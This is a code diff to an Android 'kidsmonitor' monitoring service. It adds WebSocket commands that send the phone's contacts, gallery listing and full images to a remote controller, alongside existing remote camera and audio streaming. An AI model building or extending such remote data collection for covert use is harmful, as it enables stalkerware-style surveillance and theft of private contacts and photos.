@@ -25,6 +25,8 @@ import com.kidsmonitor.R
 import com.kidsmonitor.audio.AudioStreamer
 import com.kidsmonitor.camera.CameraFacing
 import com.kidsmonitor.camera.CameraStreamer
+import com.kidsmonitor.utils.ContactManager
+import com.kidsmonitor.utils.GalleryManager
 import com.kidsmonitor.utils.MonitorActions
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
@@ -241,6 +243,42 @@ class MonitorService : LifecycleService() {
             "audioOff" -> {
                 stopMicrophone()
                 sendStatus("Audio stopped")
+            }
+            "get_contacts" -> {
+                if (hasPermission(Manifest.permission.READ_CONTACTS)) {
+                    val contacts = ContactManager(this).getContacts()
+                    val response = JsonCommand("contacts_list", mapOf("data" to Gson().toJson(contacts)))
+                    if (::wsClient.isInitialized && wsClient.isOpen) wsClient.send(Gson().toJson(response))
+                } else {
+                    sendStatus("Error: Contact Permission Missing")
+                }
+            }
+            "get_gallery" -> {
+                val perm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+                if (hasPermission(perm)) {
+                    val images = GalleryManager(this).getImages()
+                    val response = JsonCommand("gallery_list", mapOf("data" to Gson().toJson(images)))
+                    if (::wsClient.isInitialized && wsClient.isOpen) wsClient.send(Gson().toJson(response))
+                } else {
+                    sendStatus("Error: Storage Permission Missing")
+                }
+            }
+            "get_image" -> {
+                val perm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+                if (hasPermission(perm)) {
+                    val id = command.data?.get("id")?.toLongOrNull()
+                    if (id != null) {
+                        val base64 = GalleryManager(this).getImageBase64(id)
+                        if (base64 != null) {
+                            val response = JsonCommand("gallery_image", mapOf("id" to id.toString(), "data" to base64))
+                            if (::wsClient.isInitialized && wsClient.isOpen) wsClient.send(Gson().toJson(response))
+                        } else {
+                            sendStatus("Error: Image not found")
+                        }
+                    }
+                } else {
+                    sendStatus("Error: Storage Permission Missing")
+                }
             }
             "get_status" -> {
                 val status = Status(cameraStreamer.isStreaming(), isMicOn)
